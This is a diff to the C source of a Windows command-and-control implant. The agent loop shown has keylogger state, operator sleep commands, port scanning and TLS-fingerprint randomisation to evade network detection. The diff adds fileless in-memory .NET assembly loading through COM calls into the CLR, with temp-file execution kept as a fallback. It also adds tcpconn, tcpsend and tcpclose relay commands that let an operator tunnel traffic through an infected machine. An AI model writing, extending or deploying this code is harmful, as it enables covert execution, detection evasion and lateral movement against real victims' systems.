@@ -71,6 +71,7 @@
 #include <windows.h>
 #include <winternl.h>
 #include <tlhelp32.h>
+#include <oaidl.h>
 
 /* ─── SYSTEM_PROCESS_INFORMATION (NtQuerySystemInformation class 5) ─── */
 typedef struct {
@@ -1925,6 +1926,180 @@ static BOOL POLY_CLR_EXEC(PBYTE asm_bytes, SIZE_T asm_sz) {
 }
 
 /*
+ * True in-memory .NET CLR execution — no assembly bytes touch disk.
+ * Path: CorBindToRuntime → ICorRuntimeHost::GetDefaultDomain →
+ *   QI IDispatch → GetIDsOfNames("Load_3") → Invoke(SAFEARRAY(bytes)) →
+ *   _Assembly.EntryPoint → _MethodInfo.Invoke_3(null, string[]) →
+ *   stdout captured via anonymous pipe.
+ * Returns heap-allocated captured output; *olen receives byte count.
+ * Returns NULL on failure (caller falls back to disk-based path).
+ */
+static PBYTE POLY_CLR_INMEM(PBYTE ab, DWORD asz, const char *argstr, DWORD *olen) {
+    *olen=0;
+    HMODULE hMsc=LoadLibraryA("mscoree.dll");
+    if(!hMsc) return NULL;
+    HMODULE hOle=LoadLibraryA("oleaut32.dll");
+    if(!hOle){FreeLibrary(hMsc);return NULL;}
+
+    /* oleaut32 functions loaded at runtime — no link-time dep */
+    typedef SAFEARRAY*(WINAPI*pfSACV)(VARTYPE,LONG,ULONG);
+    typedef HRESULT(WINAPI*pfSAAD)(SAFEARRAY*,void**);
+    typedef HRESULT(WINAPI*pfSAUD)(SAFEARRAY*);
+    typedef HRESULT(WINAPI*pfSAD)(SAFEARRAY*);
+    typedef HRESULT(WINAPI*pfSAPE)(SAFEARRAY*,LONG*,void*);
+    typedef BSTR(WINAPI*pfSAS)(LPCOLESTR);
+    typedef void(WINAPI*pfSFS)(BSTR);
+    pfSACV fnSACV=(pfSACV)GetProcAddress(hOle,"SafeArrayCreateVector");
+    pfSAAD fnSAAD=(pfSAAD)GetProcAddress(hOle,"SafeArrayAccessData");
+    pfSAUD fnSAUD=(pfSAUD)GetProcAddress(hOle,"SafeArrayUnaccessData");
+    pfSAD  fnSAD =(pfSAD) GetProcAddress(hOle,"SafeArrayDestroy");
+    pfSAPE fnSAPE=(pfSAPE)GetProcAddress(hOle,"SafeArrayPutElement");
+    pfSAS  fnSAS =(pfSAS) GetProcAddress(hOle,"SysAllocString");
+    pfSFS  fnSFS =(pfSFS) GetProcAddress(hOle,"SysFreeString");
+    if(!fnSACV||!fnSAAD||!fnSAUD||!fnSAD||!fnSAPE||!fnSAS||!fnSFS)
+        {FreeLibrary(hOle);FreeLibrary(hMsc);return NULL;}
+
+    /* ICorRuntimeHost via CorBindToRuntime */
+    typedef HRESULT(WINAPI*pfCBR)(LPCWSTR,LPCWSTR,REFIID,LPVOID*);
+    pfCBR fnCBR=(pfCBR)GetProcAddress(hMsc,"CorBindToRuntime");
+    if(!fnCBR){FreeLibrary(hOle);FreeLibrary(hMsc);return NULL;}
+
+    static const GUID _ICRH={0xcb2f6722,0xab3a,0x11d2,{0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e}};
+    static const GUID _IID_IDisp={0x00020400,0,0,{0xC0,0,0,0,0,0,0,0x46}};
+    static const GUID _INULL={0,0,0,{0,0,0,0,0,0,0,0}};
+
+    typedef HRESULT(STDMETHODCALLTYPE*pf0)(void*);
+    typedef HRESULT(STDMETHODCALLTYPE*pfGDD)(void*,void**);
+    typedef HRESULT(STDMETHODCALLTYPE*pfQI)(void*,REFIID,void**);
+    typedef HRESULT(STDMETHODCALLTYPE*pfGIDN)(void*,void*,OLECHAR**,UINT,LCID,DISPID*);
+    typedef HRESULT(STDMETHODCALLTYPE*pfInv)(void*,DISPID,REFIID,LCID,WORD,DISPPARAMS*,VARIANT*,void*,UINT*);
+
+    PBYTE out=NULL;
+    void *pHost=NULL;
+    if(!SUCCEEDED(fnCBR(NULL,NULL,&_ICRH,&pHost))||!pHost) goto clm_exit;
+    ((pf0)(*(void***)pHost)[10])(pHost); /* Start */
+
+    void *pDomUnk=NULL;
+    ((pfGDD)(*(void***)pHost)[13])(pHost,&pDomUnk);
+    if(!pDomUnk){((pf0)(*(void***)pHost)[2])(pHost);goto clm_exit;}
+
+    void *pDom=NULL;
+    ((pfQI)(*(void***)pDomUnk)[0])(pDomUnk,&_IID_IDisp,&pDom);
+    ((pf0)(*(void***)pDomUnk)[2])(pDomUnk);
+    if(!pDom){((pf0)(*(void***)pHost)[2])(pHost);goto clm_exit;}
+
+    /* GetIDsOfNames("Load_3") — SAFEARRAY(BYTE) overload */
+    OLECHAR *nm_ld=L"Load_3"; DISPID did_ld=DISPID_UNKNOWN;
+    ((pfGIDN)(*(void***)pDom)[5])(pDom,(void*)&_INULL,&nm_ld,1,0,&did_ld);
+    if(did_ld==DISPID_UNKNOWN){
+        OLECHAR *nm_ld2=L"Load";
+        ((pfGIDN)(*(void***)pDom)[5])(pDom,(void*)&_INULL,&nm_ld2,1,0,&did_ld);
+    }
+
+    SAFEARRAY *sa_ab=NULL; VARIANT v_asm; v_asm.vt=VT_EMPTY; v_asm.pdispVal=NULL;
+    if(did_ld!=DISPID_UNKNOWN){
+        sa_ab=fnSACV(VT_UI1,0,asz);
+        if(sa_ab){
+            void *pd=NULL; fnSAAD(sa_ab,&pd);
+            if(pd) for(DWORD _i=0;_i<asz;_i++) ((BYTE*)pd)[_i]=ab[_i];
+            fnSAUD(sa_ab);
+            VARIANT v_in; v_in.vt=VT_ARRAY|VT_UI1; v_in.parray=sa_ab;
+            DISPPARAMS dp_ld={&v_in,NULL,1,0};
+            ((pfInv)(*(void***)pDom)[6])(pDom,did_ld,(void*)&_INULL,0,
+                DISPATCH_METHOD,&dp_ld,&v_asm,NULL,NULL);
+            fnSAD(sa_ab);
+        }
+    }
+    ((pf0)(*(void***)pDom)[2])(pDom);
+    ((pf0)(*(void***)pHost)[2])(pHost);
+
+    if(v_asm.vt!=VT_DISPATCH||!v_asm.pdispVal) goto clm_exit;
+    void *pAsm=(void*)v_asm.pdispVal;
+
+    /* Get EntryPoint property from _Assembly */
+    OLECHAR *nm_ep=L"EntryPoint"; DISPID did_ep=DISPID_UNKNOWN;
+    ((pfGIDN)(*(void***)pAsm)[5])(pAsm,(void*)&_INULL,&nm_ep,1,0,&did_ep);
+    VARIANT v_ep; v_ep.vt=VT_EMPTY; v_ep.pdispVal=NULL;
+    if(did_ep!=DISPID_UNKNOWN){
+        DISPPARAMS dp0={NULL,NULL,0,0};
+        ((pfInv)(*(void***)pAsm)[6])(pAsm,did_ep,(void*)&_INULL,0,
+            DISPATCH_PROPERTYGET,&dp0,&v_ep,NULL,NULL);
+    }
+    ((pf0)(*(void***)pAsm)[2])(pAsm);
+    if(v_ep.vt!=VT_DISPATCH||!v_ep.pdispVal) goto clm_exit;
+    void *pEP=(void*)v_ep.pdispVal;
+
+    /* Build SAFEARRAY(VT_VARIANT) of BSTR args from argstr */
+    int argc=0; const char *ap=argstr;
+    while(ap&&*ap){while(*ap==' ')ap++;if(*ap){argc++;while(*ap&&*ap!=' ')ap++;}}
+    SAFEARRAY *sa_args=fnSACV(VT_VARIANT,0,(ULONG)(argc>0?argc:0));
+    if(sa_args&&argc>0){
+        ap=argstr; int ai=0;
+        while(*ap&&ai<argc){
+            while(*ap==' ')ap++;
+            const char *ts=ap; while(*ap&&*ap!=' ')ap++;
+            int tl=(int)(ap-ts); WCHAR wa[512]={0};
+            for(int _w=0;_w<tl&&_w<510;_w++) wa[_w]=(WCHAR)(unsigned char)ts[_w];
+            VARIANT sv; sv.vt=VT_BSTR; sv.bstrVal=fnSAS(wa);
+            LONG idx=ai; fnSAPE(sa_args,&idx,&sv);
+            if(sv.bstrVal) fnSFS(sv.bstrVal);
+            ai++;
+        }
+    }
+
+    /* Redirect stdout/stderr to anonymous pipe */
+    HANDLE hR=NULL,hW=NULL;
+    SECURITY_ATTRIBUTES spa={sizeof(SECURITY_ATTRIBUTES),NULL,TRUE};
+    BOOL pok=CreatePipe(&hR,&hW,&spa,0);
+    HANDLE hOs=GetStdHandle(STD_OUTPUT_HANDLE);
+    HANDLE hOe=GetStdHandle(STD_ERROR_HANDLE);
+    if(pok){SetStdHandle(STD_OUTPUT_HANDLE,hW);SetStdHandle(STD_ERROR_HANDLE,hW);}
+
+    /* Invoke EntryPoint.Invoke_3(null, args) or .Invoke(null, args) */
+    OLECHAR *nm_iv=L"Invoke_3"; DISPID did_iv=DISPID_UNKNOWN;
+    ((pfGIDN)(*(void***)pEP)[5])(pEP,(void*)&_INULL,&nm_iv,1,0,&did_iv);
+    if(did_iv==DISPID_UNKNOWN){
+        OLECHAR *nm_iv2=L"Invoke";
+        ((pfGIDN)(*(void***)pEP)[5])(pEP,(void*)&_INULL,&nm_iv2,1,0,&did_iv);
+    }
+    if(did_iv!=DISPID_UNKNOWN){
+        /* IDispatch args in reverse order: [0]=parameters, [1]=obj */
+        VARIANT inv_a[2];
+        inv_a[1].vt=VT_NULL;                    /* obj = null (static method) */
+        if(sa_args){ inv_a[0].vt=VT_ARRAY|VT_VARIANT; inv_a[0].parray=sa_args; }
+        else       { inv_a[0].vt=VT_NULL; }
+        DISPPARAMS dp_iv={inv_a,NULL,2,0};
+        VARIANT v_r; v_r.vt=VT_EMPTY;
+        ((pfInv)(*(void***)pEP)[6])(pEP,did_iv,(void*)&_INULL,0,
+            DISPATCH_METHOD,&dp_iv,&v_r,NULL,NULL);
+    }
+    ((pf0)(*(void***)pEP)[2])(pEP);
+    if(sa_args) fnSAD(sa_args);
+
+    /* Restore stdout, drain pipe */
+    if(pok){
+        SetStdHandle(STD_OUTPUT_HANDLE,hOs);
+        SetStdHandle(STD_ERROR_HANDLE,hOe);
+        CloseHandle(hW);
+        DWORD bsz=131072;
+        out=(PBYTE)HeapAlloc(GetProcessHeap(),0,bsz);
+        if(out){
+            DWORD rd=0,tot=0;
+            while(ReadFile(hR,out+tot,bsz-tot-1,&rd,NULL)&&rd>0){
+                tot+=rd; if(tot>=bsz-1)break;
+            }
+            out[tot]=0; *olen=tot;
+            if(!tot){HeapFree(GetProcessHeap(),0,out);out=NULL;}
+        }
+        CloseHandle(hR);
+    }
+
+clm_exit:
+    FreeLibrary(hOle); FreeLibrary(hMsc);
+    return out;
+}
+
+/*
  * Task 12 — JA3/JA4 TLS fingerprint randomisation via SChannel.
  *
  * WinHTTP's fixed cipher/extension set produces a static JA3 that NDR tools
@@ -2618,6 +2793,48 @@ static _LT_SLOT _lt_slots[LT_MAX_CONCURRENT];
 /* Dynamic sleep interval — operator-controlled via "sleep <ms>" command.
  * Default: midpoint of the compile-time jitter range. */
 static volatile DWORD _lt_sleep_base_ms = LT_C2_JITTER_MIN + (LT_C2_JITTER_MAX - LT_C2_JITTER_MIN) / 2;
+
+/* ── TCP relay session table (SOCKS5/portfwd) ────────────────────────────── */
+#define LT_MAX_TCP_RELAY 8
+typedef struct { UINT_PTR sock; int alive; } _LT_TCP_REL;
+static _LT_TCP_REL _lt_rel[LT_MAX_TCP_RELAY];
+static volatile LONG _lt_rel_ready=0;
+/* ws2 function pointers — initialized once by _lt_tcp_setup() */
+static void *_lt_fnconn=NULL,*_lt_fnsend=NULL,*_lt_fnrecv=NULL;
+static void *_lt_fnselect=NULL,*_lt_fnclosesock=NULL,*_lt_fnsocket=NULL;
+static void *_lt_fnhtons=NULL,*_lt_fngai=NULL,*_lt_fnfai=NULL;
+static void *_lt_fnioctls=NULL,*_lt_fnstartup=NULL;
+
+static int _lt_tcp_setup(void){
+    if(InterlockedCompareExchange(&_lt_rel_ready,1,0)) return 1;
+    HMODULE hw=LoadLibraryA("ws2_32.dll");
+    if(!hw){_lt_rel_ready=0;return 0;}
+    _lt_fnstartup=GetProcAddress(hw,"WSAStartup");
+    _lt_fnsocket =GetProcAddress(hw,"socket");
+    _lt_fnconn   =GetProcAddress(hw,"connect");
+    _lt_fnsend   =GetProcAddress(hw,"send");
+    _lt_fnrecv   =GetProcAddress(hw,"recv");
+    _lt_fnselect =GetProcAddress(hw,"select");
+    _lt_fnioctls =GetProcAddress(hw,"ioctlsocket");
+    _lt_fnclosesock=GetProcAddress(hw,"closesocket");
+    _lt_fnhtons  =GetProcAddress(hw,"htons");
+    _lt_fngai    =GetProcAddress(hw,"getaddrinfo");
+    _lt_fnfai    =GetProcAddress(hw,"freeaddrinfo");
+    if(!_lt_fnstartup||!_lt_fnsocket||!_lt_fnconn||!_lt_fnsend||
+       !_lt_fnrecv||!_lt_fnselect||!_lt_fnclosesock||!_lt_fnhtons||
+       !_lt_fngai||!_lt_fnfai||!_lt_fnioctls){_lt_rel_ready=0;return 0;}
+    WSADATA wsd; lt_zero(&wsd,sizeof(wsd));
+    ((int(WINAPI*)(WORD,WSADATA*))_lt_fnstartup)(0x0202,&wsd);
+    for(int _i=0;_i<LT_MAX_TCP_RELAY;_i++){_lt_rel[_i].sock=0;_lt_rel[_i].alive=0;}
+    return 1;
+}
+
+/* Allocate relay slot; returns 0-based index or -1 */
+static int _lt_rel_alloc(void){
+    for(int i=0;i<LT_MAX_TCP_RELAY;i++)
+        if(!_lt_rel[i].alive) return i;
+    return -1;
+}
 
 /* ── Keylogger state ─────────────────────────────────────────────────────── */
 #define LT_KLOG_CAP 65536
@@ -4097,51 +4314,47 @@ static void POLY_AGENT(void) {
                 if(eo) HeapFree(GetProcessHeap(),0,eo);
                 HeapFree(GetProcessHeap(),0,task_raw); continue;
             }
-            /* Write to temp file */
-            WCHAR ea_td[512]={0},ea_tf[512]={0};
-            GetTempPathW(480,ea_td);
-            GetTempFileNameW(ea_td,L"ea",0,ea_tf);
-            /* Give it a .dll extension so dotnet recognises it */
-            WCHAR ea_dll[520]={0}; int ea_di=0;
-            while(ea_tf[ea_di]&&ea_di<515){ea_dll[ea_di]=ea_tf[ea_di];ea_di++;}
-            /* Replace last char with ".dll" */
-            if(ea_di>4){ea_di-=4; ea_dll[ea_di]=0;}
-            const WCHAR _dll[]={L'.',L'd',L'l',L'l',0};
-            for(int _di=0;_dll[_di];_di++) ea_dll[ea_di++]=_dll[_di]; ea_dll[ea_di]=0;
-            HANDLE hEaF=CreateFileW(ea_dll,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,
-                FILE_ATTRIBUTE_NORMAL,NULL);
-            if(hEaF==INVALID_HANDLE_VALUE){
-                HeapFree(GetProcessHeap(),0,ea_bytes);
-                DeleteFileW(ea_tf);
-                const char *em="[-] execasm: temp file create failed\r\n"; DWORD el=(DWORD)lt_strlen(em);
-                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
-                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
-                _lt_post_task_result(session_id,task_id,result_base,eo,el);
-                if(eo) HeapFree(GetProcessHeap(),0,eo);
-                HeapFree(GetProcessHeap(),0,task_raw); continue;
-            }
-            DWORD ea_bw=0; WriteFile(hEaF,ea_bytes,(DWORD)ea_sz,&ea_bw,NULL);
-            CloseHandle(hEaF); HeapFree(GetProcessHeap(),0,ea_bytes);
-            /* Build command: dotnet <path.dll> [args] */
-            char ea_cmd[4096]={0}; int ea_ci=0;
-            const char *ea_pfx="dotnet ";
-            for(int _p=0;ea_pfx[_p];_p++) ea_cmd[ea_ci++]=ea_pfx[_p];
-            /* append wide path as narrow */
-            for(int _wp=0;ea_dll[_wp]&&ea_ci<3900;_wp++)
-                ea_cmd[ea_ci++]=(char)(ea_dll[_wp]&0xFF);
-            if(ea_arg[ea_b64_end]==' '){
-                ea_cmd[ea_ci++]=' ';
-                const char *ea_args=ea_arg+ea_b64_end+1;
-                for(int _ap=0;ea_args[_ap]&&ea_ci<4090;_ap++) ea_cmd[ea_ci++]=ea_args[_ap];
-            }
-            ea_cmd[ea_ci]=0;
-            /* Run via POLY_EXECMD — falls back to cmd.exe which finds dotnet in PATH */
+            /* Try true in-memory CLR execution first (no disk writes) */
+            const char *ea_argstr=(ea_arg[ea_b64_end]==' ')?ea_arg+ea_b64_end+1:"";
             DWORD ea_outlen=0;
-            PBYTE ea_out=POLY_EXECMD(ea_cmd,&ea_outlen);
-            /* Cleanup temp files */
-            DeleteFileW(ea_dll); DeleteFileW(ea_tf);
+            PBYTE ea_out=POLY_CLR_INMEM(ea_bytes,ea_sz,ea_argstr,&ea_outlen);
+            HeapFree(GetProcessHeap(),0,ea_bytes);
+            /* Fallback: write temp .dll and run via dotnet CLI */
+            if(!ea_out){
+                ea_bytes=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,ea_maxsz);
+                if(ea_bytes){
+                    DWORD ea_sz2=lt_b64dec((const BYTE*)ea_arg,ea_b64_len,ea_bytes);
+                    WCHAR ea_td[512]={0},ea_tf[512]={0};
+                    GetTempPathW(480,ea_td); GetTempFileNameW(ea_td,L"ea",0,ea_tf);
+                    WCHAR ea_dll[520]={0}; int ea_di=0;
+                    while(ea_tf[ea_di]&&ea_di<515){ea_dll[ea_di]=ea_tf[ea_di];ea_di++;}
+                    if(ea_di>4){ea_di-=4;ea_dll[ea_di]=0;}
+                    const WCHAR _dll[]={L'.',L'd',L'l',L'l',0};
+                    for(int _di=0;_dll[_di];_di++) ea_dll[ea_di++]=_dll[_di]; ea_dll[ea_di]=0;
+                    HANDLE hEaF=CreateFileW(ea_dll,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,
+                        FILE_ATTRIBUTE_NORMAL,NULL);
+                    if(hEaF!=INVALID_HANDLE_VALUE){
+                        DWORD ea_bw=0; WriteFile(hEaF,ea_bytes,(DWORD)ea_sz2,&ea_bw,NULL);
+                        CloseHandle(hEaF);
+                        char ea_cmd[4096]={0}; int ea_ci=0;
+                        const char *ea_pfx="dotnet ";
+                        for(int _p=0;ea_pfx[_p];_p++) ea_cmd[ea_ci++]=ea_pfx[_p];
+                        for(int _wp=0;ea_dll[_wp]&&ea_ci<3900;_wp++)
+                            ea_cmd[ea_ci++]=(char)(ea_dll[_wp]&0xFF);
+                        if(ea_arg[ea_b64_end]==' '){
+                            ea_cmd[ea_ci++]=' ';
+                            const char *ea_a2=ea_arg+ea_b64_end+1;
+                            for(int _ap=0;ea_a2[_ap]&&ea_ci<4090;_ap++) ea_cmd[ea_ci++]=ea_a2[_ap];
+                        }
+                        ea_cmd[ea_ci]=0;
+                        ea_out=POLY_EXECMD(ea_cmd,&ea_outlen);
+                        DeleteFileW(ea_dll); DeleteFileW(ea_tf);
+                    }
+                    HeapFree(GetProcessHeap(),0,ea_bytes);
+                }
+            }
             if(!ea_out||ea_outlen==0){
-                const char *em="[-] execasm: execution failed (dotnet not found?)\r\n";
+                const char *em="[-] execasm: CLR load failed and dotnet fallback unavailable\r\n";
                 DWORD el=(DWORD)lt_strlen(em);
                 if(ea_out){HeapFree(GetProcessHeap(),0,ea_out);ea_out=NULL;ea_outlen=0;}
                 PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
@@ -4209,6 +4422,149 @@ static void POLY_AGENT(void) {
             if(sr_out) for(DWORD _i=0;_i<=sr_len;_i++) sr_out[_i]=(BYTE)sc_resp[_i];
             _lt_post_task_result(session_id,task_id,result_base,sr_out,sr_len);
             if(sr_out) HeapFree(GetProcessHeap(),0,sr_out);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* tcpconn <host> <port> — open TCP relay session for SOCKS5/portfwd */
+        } else if(lt_strpfx(command,"tcpconn ")&&command[8]){
+            const char *tc_arg=command+8;
+            char tc_host[128]={0}; int thi=0;
+            while(tc_arg[thi]&&tc_arg[thi]!=' '&&thi<127){tc_host[thi]=tc_arg[thi];thi++;}
+            DWORD tc_port=0;
+            if(tc_arg[thi]==' '){const char *pp=tc_arg+thi+1;while(*pp>='0'&&*pp<='9')tc_port=tc_port*10+(*pp++-'0');}
+            char tc_resp[64]={0};
+            if(!tc_port||!_lt_tcp_setup()){
+                const char *em="[-] tcpconn: usage: tcpconn <host> <port>\r\n"; DWORD el=(DWORD)lt_strlen(em);
+                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2);
+                if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el);
+                if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            int tc_slot=_lt_rel_alloc();
+            if(tc_slot<0){
+                const char *em="[-] tcpconn: relay table full (max 8)\r\n"; DWORD el=(DWORD)lt_strlen(em);
+                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2); if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el); if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            /* Resolve host */
+            _LT_AI tc_hints; lt_zero(&tc_hints,sizeof(tc_hints));
+            tc_hints.ai_family=2; tc_hints.ai_socktype=1;
+            _LT_AI *tc_res=NULL;
+            u_long tc_ip=0;
+            if(((int(WINAPI*)(const char*,const char*,_LT_AI*,_LT_AI**))_lt_fngai)
+                    (tc_host,NULL,&tc_hints,&tc_res)==0&&tc_res){
+                tc_ip=((struct sockaddr_in*)tc_res->ai_addr)->sin_addr.S_un.S_addr;
+                ((void(WINAPI*)(_LT_AI*))_lt_fnfai)(tc_res);
+            }
+            if(!tc_ip){
+                const char *em="[-] tcpconn: resolve failed\r\n"; DWORD el=(DWORD)lt_strlen(em);
+                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2); if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el); if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            UINT_PTR tc_sock=((UINT_PTR(WINAPI*)(int,int,int))_lt_fnsocket)(2,1,6);
+            struct sockaddr_in tc_sa; lt_zero(&tc_sa,sizeof(tc_sa));
+            tc_sa.sin_family=2; tc_sa.sin_port=((USHORT(WINAPI*)(USHORT))_lt_fnhtons)((USHORT)tc_port);
+            tc_sa.sin_addr.S_un.S_addr=tc_ip;
+            /* Non-blocking connect with 5s timeout */
+            u_long tcnb=1; ((int(WINAPI*)(UINT_PTR,long,u_long*))_lt_fnioctls)(tc_sock,0x8004667EUL,&tcnb);
+            ((int(WINAPI*)(UINT_PTR,const struct sockaddr*,int))_lt_fnconn)(tc_sock,(struct sockaddr*)&tc_sa,sizeof(tc_sa));
+            struct timeval tc_tv={5,0}; fd_set tc_fds; FD_ZERO(&tc_fds); FD_SET(tc_sock,&tc_fds);
+            int tc_sel=((int(WINAPI*)(int,void*,fd_set*,fd_set*,const struct timeval*))_lt_fnselect)
+                (0,NULL,(fd_set*)&tc_fds,NULL,&tc_tv);
+            if(tc_sel<=0){
+                ((int(WINAPI*)(UINT_PTR))_lt_fnclosesock)(tc_sock);
+                const char *em="[-] tcpconn: connection timed out\r\n"; DWORD el=(DWORD)lt_strlen(em);
+                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2); if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el); if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            /* Connected — store in table */
+            _lt_rel[tc_slot].sock=tc_sock; _lt_rel[tc_slot].alive=1;
+            const char *tc_pfx="[+] tcpconn: connected id=";
+            int ri=0; for(;tc_pfx[ri];ri++) tc_resp[ri]=tc_pfx[ri];
+            tc_resp[ri++]='0'+tc_slot; tc_resp[ri++]='\r'; tc_resp[ri++]='\n'; tc_resp[ri]=0;
+            DWORD tc_rl=(DWORD)ri;
+            PBYTE tc_ro=(PBYTE)HeapAlloc(GetProcessHeap(),0,tc_rl+2);
+            if(tc_ro) for(DWORD _i=0;_i<=tc_rl;_i++) tc_ro[_i]=(BYTE)tc_resp[_i];
+            _lt_post_task_result(session_id,task_id,result_base,tc_ro,tc_rl);
+            if(tc_ro) HeapFree(GetProcessHeap(),0,tc_ro);
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* tcpsend <id> <b64_data> — forward data through relay session, return response */
+        } else if(lt_strpfx(command,"tcpsend ")&&command[8]){
+            const char *ts_arg=command+8;
+            int ts_id=(int)(ts_arg[0]-'0'); int ts_b64_off=2;
+            if(ts_id<0||ts_id>=LT_MAX_TCP_RELAY||!_lt_rel[ts_id].alive||!_lt_tcp_setup()){
+                const char *em="[-] tcpsend: invalid or closed session id\r\n"; DWORD el=(DWORD)lt_strlen(em);
+                PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2); if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+                _lt_post_task_result(session_id,task_id,result_base,eo,el); if(eo) HeapFree(GetProcessHeap(),0,eo);
+                HeapFree(GetProcessHeap(),0,task_raw); continue;
+            }
+            UINT_PTR ts_sock=_lt_rel[ts_id].sock;
+            /* Decode and send data if any */
+            const char *ts_b64=ts_arg+ts_b64_off; DWORD ts_b64_len=(DWORD)lt_strlen(ts_b64);
+            if(ts_b64_len>4){
+                DWORD ts_max=(ts_b64_len*3)/4+8;
+                PBYTE ts_data=(PBYTE)HeapAlloc(GetProcessHeap(),0,ts_max);
+                if(ts_data){
+                    DWORD ts_dlen=lt_b64dec((const BYTE*)ts_b64,ts_b64_len,ts_data);
+                    if(ts_dlen>0) ((int(WINAPI*)(UINT_PTR,const char*,int,int))_lt_fnsend)
+                        (ts_sock,(const char*)ts_data,(int)ts_dlen,0);
+                    HeapFree(GetProcessHeap(),0,ts_data);
+                }
+            }
+            /* Read available response with 200ms timeout */
+            struct timeval ts_tv={0,200000}; fd_set ts_fds; FD_ZERO(&ts_fds); FD_SET(ts_sock,&ts_fds);
+            int ts_sel=((int(WINAPI*)(int,fd_set*,void*,void*,const struct timeval*))_lt_fnselect)
+                (0,(fd_set*)&ts_fds,NULL,NULL,&ts_tv);
+            PBYTE ts_rbuf=NULL; DWORD ts_rtotal=0;
+            if(ts_sel>0){
+                DWORD ts_rmax=65536; ts_rbuf=(PBYTE)HeapAlloc(GetProcessHeap(),0,ts_rmax);
+                if(ts_rbuf){
+                    int ts_rd;
+                    while(ts_rtotal<ts_rmax-1){
+                        /* Check if more data available */
+                        struct timeval ts_tv2={0,5000}; fd_set ts_fds2; FD_ZERO(&ts_fds2); FD_SET(ts_sock,&ts_fds2);
+                        if(((int(WINAPI*)(int,fd_set*,void*,void*,const struct timeval*))_lt_fnselect)
+                            (0,(fd_set*)&ts_fds2,NULL,NULL,&ts_tv2)<=0) break;
+                        ts_rd=((int(WINAPI*)(UINT_PTR,char*,int,int))_lt_fnrecv)
+                            (ts_sock,(char*)ts_rbuf+ts_rtotal,(int)(ts_rmax-ts_rtotal-1),0);
+                        if(ts_rd<=0){_lt_rel[ts_id].alive=0;break;}
+                        ts_rtotal+=(DWORD)ts_rd;
+                    }
+                    if(!ts_rtotal){HeapFree(GetProcessHeap(),0,ts_rbuf);ts_rbuf=NULL;}
+                }
+            }
+            /* Base64-encode response and return */
+            if(ts_rbuf&&ts_rtotal>0){
+                DWORD ts_b64sz=((ts_rtotal+2)/3)*4+8;
+                char *ts_b64out=(char*)HeapAlloc(GetProcessHeap(),0,ts_b64sz+4);
+                if(ts_b64out){
+                    lt_b64encode(ts_rbuf,ts_rtotal,ts_b64out);
+                    DWORD ts_ol=(DWORD)lt_strlen(ts_b64out);
+                    _lt_post_task_result(session_id,task_id,result_base,(PBYTE)ts_b64out,ts_ol);
+                    HeapFree(GetProcessHeap(),0,ts_b64out);
+                } else { _lt_post_task_result(session_id,task_id,result_base,(PBYTE)"",0); }
+                HeapFree(GetProcessHeap(),0,ts_rbuf);
+            } else {
+                /* No data yet — return empty (not an error) */
+                const char *em=""; DWORD el=0;
+                _lt_post_task_result(session_id,task_id,result_base,(PBYTE)em,el);
+            }
+            HeapFree(GetProcessHeap(),0,task_raw); continue;
+
+        /* tcpclose <id> — close relay session */
+        } else if(lt_strpfx(command,"tcpclose ")&&command[9]){
+            int tc2_id=(int)(command[9]-'0');
+            if(tc2_id>=0&&tc2_id<LT_MAX_TCP_RELAY&&_lt_rel[tc2_id].alive){
+                ((int(WINAPI*)(UINT_PTR))_lt_fnclosesock)(_lt_rel[tc2_id].sock);
+                _lt_rel[tc2_id].alive=0; _lt_rel[tc2_id].sock=0;
+            }
+            const char *em="[+] tcpclose: closed\r\n"; DWORD el=(DWORD)lt_strlen(em);
+            PBYTE eo=(PBYTE)HeapAlloc(GetProcessHeap(),0,el+2); if(eo) for(DWORD _i=0;_i<=el;_i++) eo[_i]=(BYTE)em[_i];
+            _lt_post_task_result(session_id,task_id,result_base,eo,el); if(eo) HeapFree(GetProcessHeap(),0,eo);
             HeapFree(GetProcessHeap(),0,task_raw); continue;
 
         /* portscan <host> [start[-end]] — TCP connect-based port scanner */
